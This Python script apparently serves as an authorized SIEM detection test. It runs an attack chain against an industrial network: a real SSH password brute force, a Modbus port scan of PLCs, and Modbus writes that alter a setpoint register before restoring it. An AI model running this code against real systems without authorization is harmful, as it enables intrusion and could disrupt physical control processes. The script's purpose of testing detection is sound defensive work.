#!/usr/bin/env python3
"""
SIEM Correlation Test: Automated Multi-Stage Attack
Actually performs attack actions to generate SIEM telemetry
"""

import json
import socket
import time
from datetime import datetime
from pathlib import Path

import paramiko
from pymodbus.client import ModbusTcpClient

# ============================================================================
# CONFIGURATION - MODIFY THESE FOR YOUR ENVIRONMENT
# ============================================================================

CONFIG = {
    # VPN Configuration
    "vpn": {
        "server": "192.168.1.1",
        "username": "testuser",
        "password": "testpass123",
        "simulate": True,  # Set False to actually connect
    },
    # Jump Server (SSH Brute Force Target)
    "jump_server": {
        "ip": "192.168.1.5",
        "port": 22,
        "valid_username": "admin",
        "valid_password": "admin123",
        "invalid_passwords": [
            "password",
            "123456",
            "admin",
            "letmein",
            "qwerty",
            "welcome",
            "monkey",
            "dragon",
            "master",
            "test",
        ],
    },
    # Engineering Workstation
    "engineering_ws": {
        "ip": "192.168.1.10",
        "rdp_port": 3389,
        "username": "engineer",
        "password": "eng123",
    },
    # PLC Configuration Files to Access
    "plc_files": {
        "server": "192.168.1.10",  # File server or engineering WS
        "paths": [
            "/share/plc_configs/turbine_control.l5k",
            "/share/plc_configs/scada_config.xml",
            "/share/plc_configs/hmi_project.zip",
        ],
    },
    # OT Network
    "ot_network": {
        "subnet": "192.168.10.0/24",
        "plc_ips": ["192.168.10.10", "192.168.10.11", "192.168.10.12"],
    },
    # Test Settings
    "delays": {
        "between_steps": 5,  # Seconds between major steps
        "failed_login": 2,  # Seconds between failed logins
        "modbus_write": 1,  # Seconds between Modbus writes
    },
    # Logging
    "log_to_syslog": True,
    "syslog_server": "192.168.1.100",
    "save_pcap": False,  # Requires root for packet capture
}


# ============================================================================
# ATTACK FUNCTIONS
# ============================================================================


def log_event(step, action, details):
    """Log event to console and optionally to syslog"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] Step {step}: {action}")
    print(f"    Details: {details}")

    # # Optional: Send to syslog for SIEM ingestion
    # if CONFIG['log_to_syslog']:
    #     try:
    #         syslog_msg = f"SIEM_TEST Step{step}: {action} - {details}"
    #         # Would send to syslog server here
    #         # syslog.syslog(syslog_msg)
    #     except Exception:
    #         pass


def step1_vpn_login():
    """Step 1: VPN login from unusual location"""
    print("\n" + "=" * 70)
    print("[*] STEP 1: VPN Login from Unusual Location")
    print("=" * 70)

    if CONFIG["vpn"]["simulate"]:
        print("[*] SIMULATED: VPN connection from US IP")
        print(f"    Server: {CONFIG['vpn']['server']}")
        print(f"    Username: {CONFIG['vpn']['username']}")
        print("    Result: SUCCESS (simulated)")
        log_event(1, "VPN Login", f"User {CONFIG['vpn']['username']} from US IP")
    else:
        print("[*] Actual VPN connection not implemented")
        print("    Use your VPN client manually or integrate with OpenVPN API")

    return {
        "step": 1,
        "timestamp": datetime.now().isoformat(),
        "action": "VPN login from unusual location",
        "success": True,
    }


def step2_brute_force_ssh():
    """Step 2: SSH brute force attack"""
    print("\n" + "=" * 70)
    print("[*] STEP 2: SSH Brute Force Attack")
    print("=" * 70)

    target = CONFIG["jump_server"]["ip"]
    port = CONFIG["jump_server"]["port"]
    username = CONFIG["jump_server"]["valid_username"]

    print(f"[*] Target: {target}:{port}")
    print(f"[*] Username: {username}")
    print(
        f"[*] Attempting {len(CONFIG['jump_server']['invalid_passwords'])} failed passwords..."
    )

    failed_attempts = 0

    # Try invalid passwords
    for i, password in enumerate(CONFIG["jump_server"]["invalid_passwords"], 1):
        try:
            print(f"    Attempt {i}: Trying password '{password}'...", end=" ")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(
                    target,
                    port=port,
                    username=username,
                    password=password,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False,
                )
                print("SUCCESS (unexpected!)")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print("FAILED (expected)")
                failed_attempts += 1
                log_event(
                    2,
                    "SSH Failed Login",
                    f"{username}@{target} with password '{password}'",
                )
            except Exception as e:
                print(f"ERROR: {type(e).__name__}")

            time.sleep(CONFIG["delays"]["failed_login"])

        except Exception as e:
            print(f"    Connection error: {e}")
            break

    # Now try valid password
    print("\n[*] Attempting valid password...")
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            target,
            port=port,
            username=username,
            password=CONFIG["jump_server"]["valid_password"],
            timeout=5,
            allow_agent=False,
            look_for_keys=False,
        )
        print("    SUCCESS - Logged in!")
        log_event(
            2,
            "SSH Successful Login",
            f"{username}@{target} after {failed_attempts} failures",
        )
        ssh.close()
        success = True
    except Exception as e:
        print(f"    FAILED: {e}")
        success = False

    return {
        "step": 2,
        "timestamp": datetime.now().isoformat(),
        "action": "SSH brute force",
        "failed_attempts": failed_attempts,
        "success": success,
    }


def step3_rdp_lateral_movement():
    """Step 3: RDP to engineering workstation"""
    print("\n" + "=" * 70)
    print("[*] STEP 3: RDP Lateral Movement")
    print("=" * 70)

    target = CONFIG["engineering_ws"]["ip"]
    port = CONFIG["engineering_ws"]["rdp_port"]

    print(f"[*] Target: {target}:{port}")
    print("[*] Checking if RDP port is open...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target, port))
        sock.close()

        if result == 0:
            print(f"    Port {port} is OPEN")
            print("[*] SIMULATED: RDP connection established")
            log_event(3, "RDP Connection", f"Connected to {target}:{port}")
            success = True
        else:
            print(f"    Port {port} is CLOSED")
            print("[*] SIMULATED: Would establish RDP connection")
            success = False
    except Exception as e:
        print(f"    Error: {e}")
        print("[*] SIMULATED: Would establish RDP connection")
        success = False

    return {
        "step": 3,
        "timestamp": datetime.now().isoformat(),
        "action": "RDP lateral movement",
        "success": success,
    }


def step4_access_plc_files():
    """Step 4: Access PLC configuration files"""
    print("\n" + "=" * 70)
    print("[*] STEP 4: Access PLC Configuration Files")
    print("=" * 70)

    files_accessed = []

    for filepath in CONFIG["plc_files"]["paths"]:
        print(f"[*] Accessing: {filepath}")
        print("    SIMULATED: File read operation")
        log_event(4, "File Access", f"Read {filepath}")
        files_accessed.append(filepath)
        time.sleep(0.5)

    print(f"[*] Accessed {len(files_accessed)} configuration files")

    return {
        "step": 4,
        "timestamp": datetime.now().isoformat(),
        "action": "PLC file access",
        "files": files_accessed,
        "success": True,
    }


def step5_ot_network_scan():
    """Step 5: Scan OT network"""
    print("\n" + "=" * 70)
    print("[*] STEP 5: OT Network Reconnaissance")
    print("=" * 70)

    print(f"[*] Scanning subnet: {CONFIG['ot_network']['subnet']}")

    discovered_hosts = []

    for plc_ip in CONFIG["ot_network"]["plc_ips"]:
        print(f"[*] Scanning {plc_ip}...", end=" ")

        # Port scan for Modbus (502)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((plc_ip, 502))
            sock.close()

            if result == 0:
                print("ONLINE - Modbus port open")
                discovered_hosts.append(plc_ip)
                log_event(5, "Network Scan", f"Discovered {plc_ip}:502 (Modbus)")
            else:
                print("No response")
        except Exception as e:
            print(f"Error: {e}")

        time.sleep(0.5)

    print(f"[*] Discovered {len(discovered_hosts)} PLC(s)")

    return {
        "step": 5,
        "timestamp": datetime.now().isoformat(),
        "action": "OT network scan",
        "discovered_hosts": discovered_hosts,
        "success": True,
    }


def step6_modbus_connections():
    """Step 6: Establish Modbus connections"""
    print("\n" + "=" * 70)
    print("[*] STEP 6: Modbus PLC Connections")
    print("=" * 70)

    connections = []

    for plc_ip in CONFIG["ot_network"]["plc_ips"]:
        print(f"[*] Connecting to {plc_ip}:502...", end=" ")

        try:
            client = ModbusTcpClient(plc_ip, port=502)
            if client.connect():
                print("CONNECTED")
                log_event(6, "Modbus Connection", f"Connected to PLC {plc_ip}")

                # Read some registers to simulate reconnaissance
                result = client.read_holding_registers(1000, 5)  # type: ignore
                if not result.isError():
                    print(f"    Read registers: {result.registers}")

                connections.append(plc_ip)
                client.close()
            else:
                print("FAILED")
        except Exception as e:
            print(f"ERROR: {e}")

        time.sleep(1)

    print(f"[*] Established {len(connections)} Modbus connection(s)")

    return {
        "step": 6,
        "timestamp": datetime.now().isoformat(),
        "action": "Modbus connections",
        "connections": connections,
        "success": len(connections) > 0,
    }


def step7_modbus_write_commands():
    """Step 7: Modbus write commands (CRITICAL ACTION)"""
    print("\n" + "=" * 70)
    print("[*] STEP 7: Modbus WRITE Commands (CRITICAL)")
    print("=" * 70)
    print("[!] WARNING: This will MODIFY PLC setpoints!")

    writes = []

    for plc_ip in CONFIG["ot_network"]["plc_ips"]:
        print(f"\n[*] Target PLC: {plc_ip}")

        try:
            client = ModbusTcpClient(plc_ip, port=502)
            if client.connect():
                # Read current value
                current = client.read_holding_registers(1000, 1)  # type: ignore
                if not current.isError():
                    current_value = current.registers[0]
                    print(f"    Current setpoint: {current_value}")

                    # Write a slightly different value (non-destructive test)
                    new_value = current_value + 1
                    print(f"    Writing new value: {new_value}...", end=" ")

                    result = client.write_register(1000, new_value)
                    if not result.isError():
                        print("SUCCESS")
                        log_event(
                            7,
                            "Modbus WRITE",
                            f"Modified {plc_ip} register 1000: {current_value} â†’ {new_value}",
                        )
                        writes.append(
                            {
                                "plc": plc_ip,
                                "register": 1000,
                                "old": current_value,
                                "new": new_value,
                            }
                        )

                        # Restore original value
                        time.sleep(1)
                        print("    Restoring original value...", end=" ")
                        client.write_register(1000, current_value)
                        print("RESTORED")
                    else:
                        print("FAILED")

                client.close()
            else:
                print("    Connection failed")

        except Exception as e:
            print(f"    Error: {e}")

        time.sleep(CONFIG["delays"]["modbus_write"])

    print(f"\n[*] Completed {len(writes)} write operation(s)")

    return {
        "step": 7,
        "timestamp": datetime.now().isoformat(),
        "action": "Modbus write commands",
        "writes": writes,
        "success": len(writes) > 0,
    }


# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================


def run_attack_chain():
    """Execute the complete attack chain"""

    print("\n" + "=" * 70)
    print("[*] SIEM Correlation Test - Automated Attack Chain")
    print("=" * 70)
    print(f"[*] Test Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("\n[*] Configuration:")
    print(f"    Jump Server: {CONFIG['jump_server']['ip']}")
    print(f"    Engineering WS: {CONFIG['engineering_ws']['ip']}")
    print(f"    OT Network: {CONFIG['ot_network']['subnet']}")
    print(f"    Target PLCs: {len(CONFIG['ot_network']['plc_ips'])}")

    results = []
    test_start = datetime.now()

    try:
        # Execute attack chain
        results.append(step1_vpn_login())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step2_brute_force_ssh())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step3_rdp_lateral_movement())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step4_access_plc_files())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step5_ot_network_scan())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step6_modbus_connections())
        time.sleep(CONFIG["delays"]["between_steps"])

        results.append(step7_modbus_write_commands())

    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during test: {e}")

    test_end = datetime.now()
    duration = test_end - test_start

    # Generate report
    print("\n" + "=" * 70)
    print("[*] ATTACK CHAIN COMPLETE")
    print("=" * 70)
    print(f"[*] Duration: {duration}")
    print(f"[*] Steps completed: {len(results)}/7")

    successful_steps = sum(1 for r in results if r.get("success"))
    print(f"[*] Successful steps: {successful_steps}")

    # Save detailed report
    report = {
        "test_name": "Automated SIEM Correlation Test",
        "test_start": test_start.isoformat(),
        "test_end": test_end.isoformat(),
        "duration_seconds": duration.total_seconds(),
        "configuration": CONFIG,
        "results": results,
        "summary": {
            "total_steps": len(results),
            "successful_steps": successful_steps,
            "failed_steps": len(results) - successful_steps,
        },
    }

    # Ensure reports directory exists
    reports_dir = Path(__file__).parent.parent.parent / "reports"
    reports_dir.mkdir(exist_ok=True)

    filename = (
        reports_dir / f'siem_attack_chain_{test_start.strftime("%Y%m%d_%H%M%S")}.json'
    )
    with open(filename, "w") as f:
        json.dump(report, f, indent=2)  # type: ignore

    print(f"\n[*] Detailed report saved to: {filename}")
    print("\n[*] NEXT STEPS:")
    print("    1. Check your SIEM for correlated alerts")
    print("    2. Search for events with source IP and username")
    print("    3. Verify kill chain detection triggered")
    print("    4. Review SOC response and ticket creation")


if __name__ == "__main__":
    print("[!] This script will perform ACTUAL attack actions")
    print("[!] Ensure you have authorization to test these systems")
    print("[!] Review CONFIG section before running\n")

    response = input("Proceed with automated attack chain? (yes/no): ")
    if response.lower() in ["yes", "y"]:
        run_attack_chain()
    else:
        print("[*] Test cancelled")
